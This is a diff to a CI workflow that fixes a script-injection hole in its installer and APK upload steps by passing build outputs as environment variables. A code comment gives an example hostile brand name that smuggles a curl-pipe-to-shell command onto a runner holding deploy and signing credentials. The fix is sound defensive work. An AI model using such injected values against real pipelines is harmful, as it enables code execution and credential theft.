@@ -317,6 +317,19 @@ jobs:
 
       - name: Upload installer to R2 staging
         shell: bash
+        env:
+          # Step outputs are DERIVED FROM THE BRAND NAME (Tauri names the bundle
+          # after productName), which a tenant controls. Interpolating them into
+          # a `run:` script is the same injection class the `version` input had:
+          # GitHub substitutes the text before bash parses it, so a brand named
+          # `Q$(curl -s x|sh)` executes on a runner holding the private-repo
+          # deploy key and the R2 + keystore credentials. Pass as data.
+          INSTALLER:      ${{ steps.collect.outputs.installer }}
+          INSTALLER_NAME: ${{ steps.collect.outputs.installer_name }}
+          DEB:            ${{ steps.collect.outputs.deb }}
+          DEB_NAME:       ${{ steps.collect.outputs.deb_name }}
+          RPM:            ${{ steps.collect.outputs.rpm }}
+          RPM_NAME:       ${{ steps.collect.outputs.rpm_name }}
         run: |
           set -euo pipefail
           bid="$BUILD_ID"; arch="${{ matrix.arch }}"
@@ -327,25 +340,25 @@ jobs:
           # Single-part PUT (s3api put-object), NOT `aws s3 cp`: cp goes multipart
           # for files >8MB and R2 bucket-scoped tokens reject CreateMultipartUpload.
           for k in $keys; do
-            if [ -n "${{ steps.collect.outputs.installer_name }}" ]; then
+            if [ -n "$INSTALLER_NAME" ]; then
               aws s3api put-object --endpoint-url "$R2_ENDPOINT" \
                 --bucket "$STAGING_BUCKET" \
-                --key "$bid/installer/$k/${{ steps.collect.outputs.installer_name }}" \
-                --body "${{ steps.collect.outputs.installer }}" >/dev/null
+                --key "$bid/installer/$k/$INSTALLER_NAME" \
+                --body "$INSTALLER" >/dev/null
             else
               echo "no installer bundle for $arch (check tauri.conf bundle targets)"
             fi
           done
           # Extra Linux formats under their own platform keys (empty on non-Linux).
-          if [ -n "${{ steps.collect.outputs.deb_name }}" ]; then
+          if [ -n "$DEB_NAME" ]; then
             aws s3api put-object --endpoint-url "$R2_ENDPOINT" --bucket "$STAGING_BUCKET" \
-              --key "$bid/installer/${arch}-deb/${{ steps.collect.outputs.deb_name }}" \
-              --body "${{ steps.collect.outputs.deb }}" >/dev/null
+              --key "$bid/installer/${arch}-deb/$DEB_NAME" \
+              --body "$DEB" >/dev/null
           fi
-          if [ -n "${{ steps.collect.outputs.rpm_name }}" ]; then
+          if [ -n "$RPM_NAME" ]; then
             aws s3api put-object --endpoint-url "$R2_ENDPOINT" --bucket "$STAGING_BUCKET" \
-              --key "$bid/installer/${arch}-rpm/${{ steps.collect.outputs.rpm_name }}" \
-              --body "${{ steps.collect.outputs.rpm }}" >/dev/null
+              --key "$bid/installer/${arch}-rpm/$RPM_NAME" \
+              --body "$RPM" >/dev/null
           fi
 
   # ── Android compile (universal APK; runs only when android/androidtv selected) ─
@@ -499,13 +512,16 @@ jobs:
 
       - name: Upload UNSIGNED APK to R2 staging (installer/android-universal)
         shell: bash
+        env:
+          APK:      ${{ steps.collect.outputs.apk }}
+          APK_NAME: ${{ steps.collect.outputs.name }}
         run: |
           set -euo pipefail
           aws s3api put-object --endpoint-url "$R2_ENDPOINT" \
             --bucket "$STAGING_BUCKET" \
-            --key "$BUILD_ID/installer/android-universal/${{ steps.collect.outputs.name }}" \
-            --body "${{ steps.collect.outputs.apk }}" >/dev/null
-          echo "· uploaded to s3://$STAGING_BUCKET/$BUILD_ID/installer/android-universal/${{ steps.collect.outputs.name }}"
+            --key "$BUILD_ID/installer/android-universal/$APK_NAME" \
+            --body "$APK" >/dev/null
+          echo "· uploaded to s3://$STAGING_BUCKET/$BUILD_ID/installer/android-universal/$APK_NAME"
 
       # NO run-artifact upload here. This repo is PUBLIC, and run artifacts are
       # downloadable by any GitHub account for their whole retention window — the
@@ -596,9 +612,10 @@ jobs:
           ANDROID_KEY_ALIAS:         ${{ secrets.ANDROID_KEY_ALIAS }}
           ANDROID_KEYSTORE_PASSWORD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
           ANDROID_KEY_PASSWORD:      ${{ secrets.ANDROID_KEY_PASSWORD }}
+          APK_PATH:                  ${{ steps.apk.outputs.path }}
         run: |
           set -euo pipefail
-          apk="${{ steps.apk.outputs.path }}"
+          apk="$APK_PATH"
           if [ -z "${ANDROID_KEYSTORE_BASE64:-}" ]; then
             echo "::error::APK staged but ANDROID_KEYSTORE_BASE64 secret is unset — cannot ship an unsigned APK"
             exit 1
